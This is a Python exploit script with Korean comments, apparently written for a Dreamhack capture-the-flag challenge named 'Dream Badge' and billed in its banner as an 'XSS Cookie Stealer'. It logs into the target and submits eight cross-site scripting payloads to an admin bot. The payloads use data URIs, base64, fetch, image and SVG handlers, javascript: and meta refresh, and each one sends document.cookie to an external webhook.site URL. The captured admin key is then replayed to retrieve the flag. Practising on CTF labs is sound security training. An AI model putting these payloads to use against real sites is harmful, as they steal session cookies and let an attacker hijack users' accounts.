#!/usr/bin/env python3
"""
Dream Badge CTF 공격 스크립트 - 개선 버전
"""

import urllib.request
import urllib.parse
import http.cookiejar
import time
import re
import base64

# 설정값
TARGET_URL = "http://host1.dreamhack.games:9266"
WEBHOOK_URL = "https://webhook.site/3465ede1-d736-4168-abb9-44ac0205f121"
USERNAME = "test_user_123"
PASSWORD = "test_pass_123"

class DreamBadgeExploit:
    def __init__(self):
        self.cookie_jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookie_jar)
        )
        
    def register(self):
        """계정 생성"""
        print(f"[*] 계정 생성 중: {USERNAME}")
        
        register_url = f"{TARGET_URL}/register.php"
        data = urllib.parse.urlencode({
            'username': USERNAME,
            'password': PASSWORD
        }).encode('utf-8')
        
        try:
            req = urllib.request.Request(register_url, data=data, method='POST')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            response = self.opener.open(req)
            html = response.read().decode('utf-8')
            
            if "Register Success" in html or "already exists" in html:
                print("[+] 계정 생성 완료")
                return True
        except Exception as e:
            print(f"[-] 계정 생성 오류: {e}")
        return False
    
    def login(self):
        """로그인"""
        print(f"[*] 로그인 중: {USERNAME}")
        
        login_url = f"{TARGET_URL}/login.php"
        data = urllib.parse.urlencode({
            'username': USERNAME,
            'password': PASSWORD
        }).encode('utf-8')
        
        try:
            req = urllib.request.Request(login_url, data=data, method='POST')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            response = self.opener.open(req)
            html = response.read().decode('utf-8')
            
            if "Login Success" in html or "welcome" in html.lower():
                print("[+] 로그인 성공")
                return True
        except Exception as e:
            print(f"[-] 로그인 오류: {e}")
        return False
    
    def send_xss_payloads(self):
        """다양한 XSS 페이로드 전송"""
        print("\n[*] XSS 페이로드 전송 시작...")
        
        # 다양한 XSS 페이로드 - 우회 기법 포함
        payloads = [
            # 1. 기본 data URI scheme
            f"data:text/html,<script>location='{WEBHOOK_URL}?cookie='+encodeURIComponent(document.cookie)</script>",
            
            # 2. Base64 인코딩된 페이로드
            self._create_base64_payload(f"<script>window.location='{WEBHOOK_URL}?c='+document.cookie</script>"),
            
            # 3. fetch API 사용
            f"data:text/html,<script>fetch('{WEBHOOK_URL}',{{method:'POST',body:document.cookie}})</script>",
            
            # 4. Image 오류 핸들러
            f"data:text/html,<img src=x onerror=\"this.src='{WEBHOOK_URL}?key='+document.cookie\">",
            
            # 5. SVG 사용
            f"data:text/html,<svg onload=\"location='{WEBHOOK_URL}?cookie='+document.cookie\">",
            
            # 6. 짧은 버전
            f"data:,<script>location='{WEBHOOK_URL}?k='+document.cookie</script>",
            
            # 7. JavaScript URI
            f"javascript:location='{WEBHOOK_URL}?cookie='+document.cookie",
            
            # 8. Meta refresh (시간차 공격)
            f"data:text/html,<meta http-equiv='refresh' content='0;url={WEBHOOK_URL}?c='+document.cookie>",
        ]
        
        bot_url = f"{TARGET_URL}/bot"
        successful_payloads = []
        
        for i, payload in enumerate(payloads, 1):
            print(f"\n[*] 페이로드 {i}/{len(payloads)} 전송 중...")
            print(f"    타입: {self._get_payload_type(payload)}")
            
            data = urllib.parse.urlencode({
                'path': payload
            }).encode('utf-8')
            
            try:
                req = urllib.request.Request(bot_url, data=data, method='POST')
                req.add_header('Content-Type', 'application/x-www-form-urlencoded')
                response = self.opener.open(req)
                html = response.read().decode('utf-8')
                
                if "success" in html.lower() or "submitted" in html.lower():
                    print(f"[+] 페이로드 {i} 전송 성공!")
                    successful_payloads.append(i)
                    time.sleep(2)  # Bot 처리 대기
                else:
                    print(f"[-] 페이로드 {i} 응답 확인 필요")
                    
            except Exception as e:
                print(f"[-] 페이로드 {i} 오류: {e}")
                continue
        
        print(f"\n[*] 성공한 페이로드: {successful_payloads}")
        print("\n" + "="*60)
        print("[!] Webhook 확인 필요!")
        print(f"[!] URL: {WEBHOOK_URL}")
        print("[!] 'key=' 또는 'cookie=' 파라미터 확인")
        print("="*60)
        
    def _create_base64_payload(self, html):
        """Base64 인코딩된 data URI 생성"""
        encoded = base64.b64encode(html.encode()).decode()
        return f"data:text/html;base64,{encoded}"
    
    def _get_payload_type(self, payload):
        """페이로드 타입 식별"""
        if "base64" in payload:
            return "Base64 인코딩"
        elif "javascript:" in payload:
            return "JavaScript URI"
        elif "onerror" in payload:
            return "Image Error Handler"
        elif "svg" in payload.lower():
            return "SVG"
        elif "fetch" in payload:
            return "Fetch API"
        elif "meta" in payload:
            return "Meta Refresh"
        else:
            return "Data URI"
    
    def get_flag_with_key(self, admin_key):
        """Admin key로 플래그 획득"""
        print(f"\n[*] Admin key로 플래그 획득 시도...")
        
        # 새로운 opener 생성 (깨끗한 세션)
        clean_jar = http.cookiejar.CookieJar()
        clean_opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(clean_jar)
        )
        
        # Admin 쿠키 설정
        cookie = http.cookiejar.Cookie(
            version=0, name='key', value=admin_key,
            port=None, port_specified=False,
            domain=TARGET_URL.replace('http://', '').split(':')[0],
            domain_specified=False, domain_initial_dot=False,
            path='/', path_specified=True,
            secure=False, expires=None, discard=True,
            comment=None, comment_url=None,
            rest={}, rfc2109=False
        )
        clean_jar.set_cookie(cookie)
        
        # view_badge.php 접근
        view_url = f"{TARGET_URL}/view_badge.php"
        
        try:
            req = urllib.request.Request(view_url)
            response = clean_opener.open(req)
            html = response.read().decode('utf-8')
            
            # 플래그 패턴 검색
            flag_patterns = [
                r'DH\{[^}]+\}',
                r'FLAG\{[^}]+\}',
                r'flag\{[^}]+\}',
                r'dreamhack\{[^}]+\}',
                r'UCC\{[^}]+\}'
            ]
            
            for pattern in flag_patterns:
                matches = re.findall(pattern, html, re.IGNORECASE)
                if matches:
                    for flag in matches:
                        print(f"\n{'='*60}")
                        print(f"[!!!] 🎉 플래그 발견: {flag}")
                        print(f"{'='*60}\n")
                        return flag
            
            # 플래그를 못 찾았지만 Admin 페이지인 경우
            if "admin" in html.lower():
                print("[!] Admin 페이지 접근 성공!")
                print("[*] 페이지 내용 분석 중...")
                
                # HTML 태그 제거하고 텍스트만 추출
                text = re.sub('<[^<]+?>', '', html)
                if len(text) > 100:
                    print(f"\n페이지 텍스트 (일부):\n{text[:500]}")
                    
        except urllib.error.HTTPError as e:
            print(f"[-] HTTP 오류: {e.code}")
            if e.code == 403:
                print("[!] 403 Forbidden - Admin key가 올바르지 않을 수 있습니다")
        except Exception as e:
            print(f"[-] 오류: {e}")
            
        return None
    
    def manual_flag_check(self):
        """수동으로 admin key 입력받아 플래그 확인"""
        print("\n" + "="*60)
        print("[*] 수동 Admin Key 입력 모드")
        print("="*60)
        print("[!] Webhook에서 받은 쿠키 값을 확인하세요")
        print("[!] 형식: key=xxxxxxxxxxxxx")
        print("[!] 'key=' 부분을 제외하고 값만 입력하세요")
        print("="*60)
        
        while True:
            admin_key = input("\n[?] Admin key 입력 (q: 종료): ").strip()
            
            if admin_key.lower() == 'q':
                break
                
            if admin_key:
                # key= 프리픽스 제거
                if admin_key.startswith('key='):
                    admin_key = admin_key[4:]
                    
                flag = self.get_flag_with_key(admin_key)
                if flag:
                    return flag
                else:
                    print("[!] 다시 시도하거나 다른 key를 입력하세요")
            else:
                print("[-] key를 입력하세요")
                
        return None
    
    def run(self):
        """전체 공격 실행"""
        print("\n" + "="*60)
        print(" 🏴 Dream Badge CTF Exploit")
        print("="*60)
        print(f"🎯 Target: {TARGET_URL}")
        print(f"📡 Webhook: {WEBHOOK_URL}")
        print("="*60 + "\n")
        
        # 1. 계정 생성/로그인
        if not self.register():
            print("[!] 계정이 이미 존재할 수 있습니다")
            
        if not self.login():
            print("[-] 로그인 실패. 종료합니다")
            return
        
        # 2. XSS 페이로드 전송
        self.send_xss_payloads()
        
        # 3. Admin key로 플래그 획득
        flag = self.manual_flag_check()
        
        if flag:
            print("\n" + "="*60)
            print(f"[+] 🎊 공격 성공!")
            print(f"[+] 플래그: {flag}")
            print("="*60)
        else:
            print("\n[-] 플래그를 찾지 못했습니다")
            print("[!] Webhook을 다시 확인하거나 페이로드를 수정해보세요")

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║     Dream Badge CTF Exploit Tool      ║
    ║         XSS Cookie Stealer            ║
    ╚═══════════════════════════════════════╝
    """)
    
    exploit = DreamBadgeExploit()
    
    try:
        exploit.run()
    except KeyboardInterrupt:
        print("\n\n[!] 사용자 중단")
    except Exception as e:
        print(f"\n[-] 예상치 못한 오류: {e}")
        import traceback
        traceback.print_exc()
    
    print("\n[*] 종료")

if __name__ == "__main__":
    main()